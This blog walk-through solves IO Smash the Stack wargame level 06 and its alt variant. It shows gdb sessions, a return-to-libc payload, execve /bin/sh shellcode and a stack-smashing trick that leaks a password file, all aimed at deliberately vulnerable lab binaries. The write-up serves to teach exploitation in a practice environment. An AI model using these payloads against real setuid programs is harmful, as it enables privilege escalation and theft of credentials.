+++
title = "IO Smash the stack level 06"
date = "2016-01-28T15:16:00-02:00"
publishdate = "2016-01-28"
categories =["Security"]
tags = ["Wargames", "C"]
slug = "io-smashthestack-level-06"
project_url = "https://greyhat.dk/io-smashthestack-level-06"
type = "post"
description = "Walk-through"
+++

## Level06

```sh
level6@io:/levels$ ls -la level06*
-r-sr-x--- 1 level7 level6 5849 Dec 18  2013 level06
-r-sr-x--- 1 level7 level6 7293 Aug 11  2010 level06_alt
-r-------- 1 level6 level6  487 Nov 14  2011 level06_alt.c
-r-------- 1 level7 level7   22 Sep 14 03:31 level06_alt.pass
-r-------- 1 level6 level6 1034 May  7  2015 level06.c
```

level6@io:/levels$ cat level06.c
```c
//written by bla
//inspired by nnp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

enum{
LANG_ENGLISH,
LANG_FRANCAIS,
LANG_DEUTSCH,
};

int language = LANG_ENGLISH;

struct UserRecord{
	char name[40];
	char password[32];
	int id;
};

void greetuser(struct UserRecord user){
	char greeting[64];
	switch(language){
		case LANG_ENGLISH:
			strcpy(greeting, "Hi "); break;
		case LANG_FRANCAIS:
			strcpy(greeting, "Bienvenue "); break;
		case LANG_DEUTSCH:
			strcpy(greeting, "Willkommen "); break;
	}
	strcat(greeting, user.name);
	printf("%s\n", greeting);
}

int main(int argc, char **argv, char **env){
	if(argc != 3) {
		printf("USAGE: %s [name] [password]\n", argv[0]);
		return 1;
	}

	struct UserRecord user = {0};
	strncpy(user.name, argv[1], sizeof(user.name));
	strncpy(user.password, argv[2], sizeof(user.password));

	char *envlang = getenv("LANG");
	if(envlang)
		if(!memcmp(envlang, "fr", 2))
			language = LANG_FRANCAIS;
		else if(!memcmp(envlang, "de", 2))
			language = LANG_DEUTSCH;

	greetuser(user);
}
```

Oki the insecure function here is strcat and the overflow occurs when adding to greeting. In order to exploit it we need to add some data hence exporting LANG

```sh
level6@io:/levels$ export LANG=de
level6@io:/levels$ gdb -q level06
Reading symbols from /levels/level06...(no debugging symbols found)...done.
(gdb) r $(python -c 'print "A" * 40 + " " + "B" * 40')
Starting program: /levels/level06 $(python -c 'print "A" * 40 + " " + "B" * 40')
Willkommen AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/100xw $esp
0xbffffbd0:	0x00424242	0x41414141	0x41414141	0x41414141
0xbffffbe0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffbf0:	0x41414141	0x41414141	0x42424242	0x42424242
0xbffffc00:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffffc10:	0x42424242	0x42424242	0x00000000	0x00000001
0xbffffc20:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc30:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc40:	0x41414141	0x41414141	0x42424242	0x42424242
0xbffffc50:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffffc60:	0x42424242	0x42424242	0x00000000	0xbfffffa5
0xbffffc70:	0xb7e9e515	0xb7ff0590	0x080486db	0xb7fceff4
0xbffffc80:	0x00000000	0x00000000	0xbffffd08	0xb7e85e46
0xbffffc90:	0x00000003	0xbffffd34	0xbffffd44	0xb7fe08d8
0xbffffca0:	0xb7ff6821	0xffffffff	0xb7ffeff4	0x080482da
0xbffffcb0:	0x00000001	0xbffffcf0	0xb7fefc16	0xb7fffac0
0xbffffcc0:	0xb7fe0bd0	0xb7fceff4	0x00000000	0x00000000
0xbffffcd0:	0xbffffd08	0x1d82ddcf	0x32c7ebdf	0x00000000
0xbffffce0:	0x00000000	0x00000000	0x00000003	0x08048430
0xbffffcf0:	0x00000000	0xb7ff59c0	0xb7e85d6b	0xb7ffeff4
0xbffffd00:	0x00000003	0x08048430	0x00000000	0x08048451
0xbffffd10:	0x08048593	0x00000003	0xbffffd34	0x080486d0
0xbffffd20:	0x080486c0	0xb7ff0590	0xbffffd2c	0xb7fff908
0xbffffd30:	0x00000003	0xbffffe43	0xbffffe53	0xbffffe7c
0xbffffd40:	0x00000000	0xbffffea5	0xbffffeb5	0xbffffec9
0xbffffd50:	0xbffffedc	0xbffffee8	0xbfffff0f	0xbfffff1b
```

Oki so we can overwrite the return adress but look at the stack. Its mixed with A's and B's and contains a 0x00000000. I haven't tried the 'return 2 libc' before so I wanted to give it a spin. In order for this to work we need to create our own fake stack like so

[ address of exit] [ address of '/bin/sh' ] [ AAAA ... ] .. [ BBBB ...] [ address of system ]

```sh
level6@io:/levels$ gdb -q level06
Reading symbols from /levels/level06...(no debugging symbols found)...done.
(gdb) disassemble greetuser
Dump of assembler code for function greetuser:
   0x0804851c <+0>:	push   %ebp
   0x0804851d <+1>:	mov    %esp,%ebp
   0x0804851f <+3>:	sub    $0x58,%esp
   0x08048522 <+6>:	mov    0x8049964,%eax
   0x08048527 <+11>:	cmp    $0x1,%eax
   0x0804852a <+14>:	je     0x8048540 <greetuser+36>
   0x0804852c <+16>:	cmp    $0x2,%eax
   0x0804852f <+19>:	je     0x804855c <greetuser+64>
   0x08048531 <+21>:	test   %eax,%eax
   0x08048533 <+23>:	jne    0x8048574 <greetuser+88>
   0x08048535 <+25>:	lea    -0x48(%ebp),%eax
   0x08048538 <+28>:	movl   $0x206948,(%eax)
   0x0804853e <+34>:	jmp    0x8048574 <greetuser+88>
   0x08048540 <+36>:	lea    -0x48(%ebp),%eax
   0x08048543 <+39>:	movl   $0x6e656942,(%eax)
   0x08048549 <+45>:	movl   $0x756e6576,0x4(%eax)
   0x08048550 <+52>:	movw   $0x2065,0x8(%eax)
   0x08048556 <+58>:	movb   $0x0,0xa(%eax)
   0x0804855a <+62>:	jmp    0x8048574 <greetuser+88>
   0x0804855c <+64>:	lea    -0x48(%ebp),%eax
   0x0804855f <+67>:	movl   $0x6c6c6957,(%eax)
   0x08048565 <+73>:	movl   $0x6d6d6f6b,0x4(%eax)
   0x0804856c <+80>:	movl   $0x206e65,0x8(%eax)
   0x08048573 <+87>:	nop
   0x08048574 <+88>:	lea    0x8(%ebp),%eax
   0x08048577 <+91>:	mov    %eax,0x4(%esp)
   0x0804857b <+95>:	lea    -0x48(%ebp),%eax
   0x0804857e <+98>:	mov    %eax,(%esp)
   0x08048581 <+101>:	call   0x80483d0 <strcat@plt>
   0x08048586 <+106>:	lea    -0x48(%ebp),%eax
   0x08048589 <+109>:	mov    %eax,(%esp)
   0x0804858c <+112>:	call   0x80483f0 <puts@plt>
   0x08048591 <+117>:	leave
   0x08048592 <+118>:	ret
End of assembler dump.
(gdb) break *0x0804857e
(gdb) source /usr/local/peda/peda.py
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xb7eaac30 <system>
gdb-peda$ p exit
$2 = {<text variable, no debug info>} 0xb7e9e270 <exit>
gdb-peda$ searchmem /bin/sh
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xb7fab194 ("/bin/sh")
gdb-peda$ r $(python -c 'print "\x70\xe2\xe9\xb7" + "\x94\xb1\xfa\xb7" + "A"*32 + " " + "B"*25 + "\x30\xac\xea\xb7"')
[----------------------------------registers-----------------------------------]
EAX: 0xbffffb50 ("Willkommen ")
EBX: 0xbffffbf0 --> 0xb7e9e270 (<exit>:	push   ebp)
ECX: 0x0
EDX: 0xbffffba0 --> 0xb7e9e270 (<exit>:	push   ebp)
ESI: 0xbffffc3c --> 0xbfffffa5 --> 0x4c006564 ('de')
EDI: 0xbffffbec --> 0x1
EBP: 0xbffffb98 --> 0xbffffc58 --> 0xbffffcd8 --> 0x0
ESP: 0xbffffb40 --> 0xb7ee7ee6 (<memcmp+6>:	add    ebx,0xe710e)
EIP: 0x804857e (<greetuser+98>:	mov    DWORD PTR [esp],eax)
EFLAGS: 0x200246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048574 <greetuser+88>:	lea    eax,[ebp+0x8]
   0x8048577 <greetuser+91>:	mov    DWORD PTR [esp+0x4],eax
   0x804857b <greetuser+95>:	lea    eax,[ebp-0x48]
=> 0x804857e <greetuser+98>:	mov    DWORD PTR [esp],eax
   0x8048581 <greetuser+101>:	call   0x80483d0 <strcat@plt>
   0x8048586 <greetuser+106>:	lea    eax,[ebp-0x48]
   0x8048589 <greetuser+109>:	mov    DWORD PTR [esp],eax
   0x804858c <greetuser+112>:	call   0x80483f0 <puts@plt>
[------------------------------------stack-------------------------------------]
0000| 0xbffffb40 --> 0xb7ee7ee6 (<memcmp+6>:	add    ebx,0xe710e)
0004| 0xbffffb44 --> 0xbffffba0 --> 0xb7e9e270 (<exit>:	push   ebp)
0008| 0xbffffb48 --> 0xb7fefcf2 (lea    esi,[esi+0x0])
0012| 0xbffffb4c --> 0xb7fffac0 --> 0xb7fffa64 --> 0xb7fe0ba0 --> 0xb7fff908 --> 0x0
0016| 0xbffffb50 ("Willkommen ")
0020| 0xbffffb54 ("kommen ")
0024| 0xbffffb58 --> 0x206e65 ('en ')
0028| 0xbffffb5c --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0804857e in greetuser ()
gdb-peda$ x/64xw $esp
0xbffffb40:	0xb7ee7ee6	0xbffffba0	0xb7fefcf2	0xb7fffac0
0xbffffb50:	0x6c6c6957	0x6d6d6f6b	0x00206e65	0x00000000
0xbffffb60:	0x00000001	0x08048288	0x0804993c	0x00000000
0xbffffb70:	0xb7e76874	0xbffffbf0	0x00000000	0xbffffc3c
0xbffffb80:	0xbffffc58	0xb7ff59c0	0x00000002	0xb7ee7f30
0xbffffb90:	0xb7ee7f67	0x00000000	0xbffffc58	0x080486af
0xbffffba0:	0xb7e9e270	0xb7fab194	0x41414141	0x41414141
0xbffffbb0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffbc0:	0x41414141	0x41414141	0x42424242	0x42424242
0xbffffbd0:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffffbe0:	0xeaac3042	0x000000b7	0x00000000	0x00000001
0xbffffbf0:	0xb7e9e270	0xb7fab194	0x41414141	0x41414141
0xbffffc00:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc10:	0x41414141	0x41414141	0x42424242	0x42424242
0xbffffc20:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffffc30:	0xeaac3042	0x000000b7	0x00000000	0xbfffffa5
gdb-peda$ quit
level6@io:/levels$ ./level06 $(python -c 'print "\x70\xe2\xe9\xb7" + "\x94\xb1\xfa\xb7" + "A"*32 + " " + "B"*25 + "\x30\xac\xea\xb7"')
Willkommen p�鷔��AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBB0��
sh-4.2$ cat /home/level7/.pass
XXXXXXXXXXXXXXXX
```

And easier way would be just to use the EGG from level05

```sh
level6@io:/levels$ export LANG="de"
level6@io:/levels$ export EGG=$(python -c 'print "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"')
level6@io:/levels$ /tmp/desdic1/getenv EGG /levels/level06
EGG will be at 0xbffffed3
level6@io:/levels$ /levels/level06 $(python -c 'print "A"*40 + " " + "B"*25 + "\xd3\xfe\xff\xbf"')
Willkommen AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBB����
sh-4.2$ cat /home/level7/.pass
XXXXXXXXXXXXXXXX
```


## Level06 alt

```c
#include <stdio.h>
#include <sys/fcntl.h>
#include <unistd.h>
#include <string.h>

char pass[32];

int main(int argc, char * argv[])
{

        char buf[32];
        FILE *f;

        f = fopen("/levels/level06_alt.pass", "r");

        fgets(pass, 32, f);
        fgets(buf, 999, stdin);

        if(!strcmp(buf, pass)) {
                printf("Success!\n");
                setreuid(geteuid(), geteuid());
                execl("/bin/sh", NULL, NULL);
        }

        return 0;
}
```

Since we cannot use GDB on a suid file that needs to read a file I have made a copy of the binary:

```sh
mkdir -p /tmp/des6 && cd /tmp/des6 && cp /levels/level06_alt aaaaaaaaa
echo "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC" > bbbbbbbbbbbbbb
```

Next edit the aaaaaaaaa and change the path from /levels/level06_alt.pass to /tmp/des6/bbbbbbbbbbbbbb

```sh
level6@io:/tmp/des6$ gdb -q aaaaaaaaa
Reading symbols from /tmp/des6/aaaaaaaaa...done.
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
   0x08048574 <+0>:	lea    ecx,[esp+0x4]
   0x08048578 <+4>:	and    esp,0xfffffff0
   0x0804857b <+7>:	push   DWORD PTR [ecx-0x4]
   0x0804857e <+10>:	push   ebp
   0x0804857f <+11>:	mov    ebp,esp
   0x08048581 <+13>:	push   ebx
   0x08048582 <+14>:	push   ecx
   0x08048583 <+15>:	sub    esp,0x40
   0x08048586 <+18>:	mov    eax,DWORD PTR [ecx+0x4]
   0x08048589 <+21>:	mov    DWORD PTR [ebp-0x3c],eax
   0x0804858c <+24>:	mov    eax,gs:0x14
   0x08048592 <+30>:	mov    DWORD PTR [ebp-0xc],eax
   0x08048595 <+33>:	xor    eax,eax
   0x08048597 <+35>:	mov    DWORD PTR [esp+0x4],0x8048720
   0x0804859f <+43>:	mov    DWORD PTR [esp],0x8048722
   0x080485a6 <+50>:	call   0x8048460 <fopen@plt>
   0x080485ab <+55>:	mov    DWORD PTR [ebp-0x30],eax
   0x080485ae <+58>:	mov    eax,DWORD PTR [ebp-0x30]
   0x080485b1 <+61>:	mov    DWORD PTR [esp+0x8],eax
   0x080485b5 <+65>:	mov    DWORD PTR [esp+0x4],0x20
   0x080485bd <+73>:	mov    DWORD PTR [esp],0x80498a0
   0x080485c4 <+80>:	call   0x8048430 <fgets@plt>
   0x080485c9 <+85>:	mov    eax,ds:0x8049880
   0x080485ce <+90>:	mov    DWORD PTR [esp+0x8],eax
   0x080485d2 <+94>:	mov    DWORD PTR [esp+0x4],0x3e7
   0x080485da <+102>:	lea    eax,[ebp-0x2c]
   0x080485dd <+105>:	mov    DWORD PTR [esp],eax
   0x080485e0 <+108>:	call   0x8048430 <fgets@plt>
   0x080485e5 <+113>:	mov    DWORD PTR [esp+0x4],0x80498a0
   0x080485ed <+121>:	lea    eax,[ebp-0x2c]
   0x080485f0 <+124>:	mov    DWORD PTR [esp],eax
   0x080485f3 <+127>:	call   0x80484a0 <strcmp@plt>
   0x080485f8 <+132>:	test   eax,eax
   0x080485fa <+134>:	jne    0x804863c <main+200>
   0x080485fc <+136>:	mov    DWORD PTR [esp],0x804873b
   0x08048603 <+143>:	call   0x8048490 <puts@plt>
   0x08048608 <+148>:	call   0x80484b0 <geteuid@plt>
   0x0804860d <+153>:	mov    ebx,eax
   0x0804860f <+155>:	call   0x80484b0 <geteuid@plt>
   0x08048614 <+160>:	mov    DWORD PTR [esp+0x4],ebx
   0x08048618 <+164>:	mov    DWORD PTR [esp],eax
   0x0804861b <+167>:	call   0x8048480 <setreuid@plt>
   0x08048620 <+172>:	mov    DWORD PTR [esp+0x8],0x0
   0x08048628 <+180>:	mov    DWORD PTR [esp+0x4],0x0
   0x08048630 <+188>:	mov    DWORD PTR [esp],0x8048744
   0x08048637 <+195>:	call   0x8048450 <execl@plt>
   0x0804863c <+200>:	mov    eax,0x0
   0x08048641 <+205>:	mov    edx,DWORD PTR [ebp-0xc]
   0x08048644 <+208>:	xor    edx,DWORD PTR gs:0x14
   0x0804864b <+215>:	je     0x8048652 <main+222>
   0x0804864d <+217>:	call   0x8048470 <__stack_chk_fail@plt>
   0x08048652 <+222>:	add    esp,0x40
   0x08048655 <+225>:	pop    ecx
   0x08048656 <+226>:	pop    ebx
   0x08048657 <+227>:	pop    ebp
---Type <return> to continue, or q <return> to quit---c
   0x08048658 <+228>:	lea    esp,[ecx-0x4]
   0x0804865b <+231>:	ret
End of assembler dump.
(gdb) break *0x080485e5
Breakpoint 1 at 0x80485e5
(gdb) r <<< $(python -c 'print "A"*232 + "\xa0\x98\x04\x08"')
Starting program: /tmp/des6/aaaaaaaaa <<< $(python -c 'print "A"*232 + "\xa0\x98\x04\x08"')

Breakpoint 1, 0x080485e5 in main ()
(gdb) x/100x $esp
0xbffffc50:	0xbffffc6c	0x000003e7	0xb7fcf440	0xbffffd54
0xbffffc60:	0x00000000	0xbffffd00	0x0804a008	0x41414141
0xbffffc70:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc80:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc90:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffca0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffcb0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffcc0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffcd0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffce0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffcf0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffd00:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffd10:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffd20:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffd30:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffd40:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffd50:	0x41414141	0x080498a0	0x0000000a	0xbffffe77
0xbffffd60:	0xbffffe87	0xbffffe9b	0xbffffeae	0xbffffecd
0xbffffd70:	0xbffffed9	0xbfffff00	0xbfffff0c	0xbfffff60
0xbffffd80:	0xbfffff76	0xbfffff85	0xbfffff93	0xbfffffa4
0xbffffd90:	0xbfffffad	0xbfffffbf	0xbfffffc7	0xbfffffd9
0xbffffda0:	0x00000000	0x00000020	0xb7fe1418	0x00000021
0xbffffdb0:	0xb7fe1000	0x00000010	0x178bfbfd	0x00000006
0xbffffdc0:	0x00001000	0x00000011	0x00000064	0x00000003
0xbffffdd0:	0x08048034	0x00000004	0x00000020	0x00000005
(gdb) x/x 0x080498a0
0x80498a0 <pass>:	0x43434343
(gdb)
0x80498a4 <pass+4>:	0x43434343
(gdb)
0x80498a8 <pass+8>:	0x43434343
(gdb)
0x80498ac <pass+12>:	0x43434343
(gdb)
0x80498b0 <pass+16>:	0x43434343
(gdb)
0x80498b4 <pass+20>:	0x43434343
(gdb)
0x80498b8 <pass+24>:	0x43434343
(gdb)
0x80498bc <pass+28>:	0x00434343
(gdb)
0x80498c0:	0x00000000
(gdb) c
Continuing.
*** stack smashing detected ***: CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC terminated
======= Backtrace: =========
/lib/i386-linux-gnu/i686/cmov/libc.so.6(__fortify_fail+0x50)[0xb7f59750]
/lib/i386-linux-gnu/i686/cmov/libc.so.6(+0xee6fa)[0xb7f596fa]
CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[0x8048652]
[0x41414141]
======= Memory map: ========
08048000-08049000 r-xp 00000000 fe:00 270793     /tmp/des6/aaaaaaaaa
08049000-0804a000 rw-p 00000000 fe:00 270793     /tmp/des6/aaaaaaaaa
0804a000-0806b000 rw-p 00000000 00:00 0          [heap]
b7e41000-b7e5d000 r-xp 00000000 fe:00 393223     /lib/i386-linux-gnu/libgcc_s.so.1
b7e5d000-b7e5e000 rw-p 0001b000 fe:00 393223     /lib/i386-linux-gnu/libgcc_s.so.1
b7e6a000-b7e6b000 rw-p 00000000 00:00 0
b7e6b000-b7fcc000 r-xp 00000000 fe:00 395198     /lib/i386-linux-gnu/i686/cmov/libc-2.13.so
b7fcc000-b7fcd000 ---p 00161000 fe:00 395198     /lib/i386-linux-gnu/i686/cmov/libc-2.13.so
b7fcd000-b7fcf000 r--p 00161000 fe:00 395198     /lib/i386-linux-gnu/i686/cmov/libc-2.13.so
b7fcf000-b7fd0000 rw-p 00163000 fe:00 395198     /lib/i386-linux-gnu/i686/cmov/libc-2.13.so
b7fd0000-b7fd3000 rw-p 00000000 00:00 0
b7fdd000-b7fe1000 rw-p 00000000 00:00 0
b7fe1000-b7fe2000 r-xp 00000000 00:00 0          [vdso]
b7fe2000-b7ffe000 r-xp 00000000 fe:00 401958     /lib/i386-linux-gnu/ld-2.13.so
b7ffe000-b7fff000 r--p 0001b000 fe:00 401958     /lib/i386-linux-gnu/ld-2.13.so
b7fff000-b8000000 rw-p 0001c000 fe:00 401958     /lib/i386-linux-gnu/ld-2.13.so
bffdf000-c0000000 rw-p 00000000 00:00 0          [stack]

Program received signal SIGABRT, Aborted.
0xb7fe1428 in __kernel_vsyscall ()
(gdb)
```

Oki so we changed argv[0] to point to 0x080498a0 (The pointer to the flag). So ..

```sh
level6@io:~$ python -c 'print "A"*232 + "\xa0\x98\x04\x08"'|/levels/level06_alt
*** stack smashing detected ***: XXXXXXXXXXXXXXXXXXXXX
 terminated
======= Backtrace: =========
/lib/i386-linux-gnu/i686/cmov/libc.so.6(__fortify_fail+0x50)[0xb7f59750]
/lib/i386-linux-gnu/i686/cmov/libc.so.6(+0xee6fa)[0xb7f596fa]
XXXXXXXXXXXXXXXXXXXXX
[0x8048652]
[0x41414141]
======= Memory map: ========
08048000-08049000 r-xp 00000000 fe:00 268704     /levels/level06_alt
08049000-0804a000 rw-p 00000000 fe:00 268704     /levels/level06_alt
0804a000-0806b000 rw-p 00000000 00:00 0          [heap]
b7e41000-b7e5d000 r-xp 00000000 fe:00 393223     /lib/i386-linux-gnu/libgcc_s.so.1
b7e5d000-b7e5e000 rw-p 0001b000 fe:00 393223     /lib/i386-linux-gnu/libgcc_s.so.1
b7e6a000-b7e6b000 rw-p 00000000 00:00 0
b7e6b000-b7fcc000 r-xp 00000000 fe:00 395198     /lib/i386-linux-gnu/i686/cmov/libc-2.13.so
b7fcc000-b7fcd000 ---p 00161000 fe:00 395198     /lib/i386-linux-gnu/i686/cmov/libc-2.13.so
b7fcd000-b7fcf000 r--p 00161000 fe:00 395198     /lib/i386-linux-gnu/i686/cmov/libc-2.13.so
b7fcf000-b7fd0000 rw-p 00163000 fe:00 395198     /lib/i386-linux-gnu/i686/cmov/libc-2.13.so
b7fd0000-b7fd3000 rw-p 00000000 00:00 0
b7fdd000-b7fe1000 rw-p 00000000 00:00 0
b7fe1000-b7fe2000 r-xp 00000000 00:00 0          [vdso]
b7fe2000-b7ffe000 r-xp 00000000 fe:00 401958     /lib/i386-linux-gnu/ld-2.13.so
b7ffe000-b7fff000 r--p 0001b000 fe:00 401958     /lib/i386-linux-gnu/ld-2.13.so
b7fff000-b8000000 rw-p 0001c000 fe:00 401958     /lib/i386-linux-gnu/ld-2.13.so
bffdf000-c0000000 rw-p 00000000 00:00 0          [stack]
Aborted
```

Special thanks to Konrad for showing me this trick
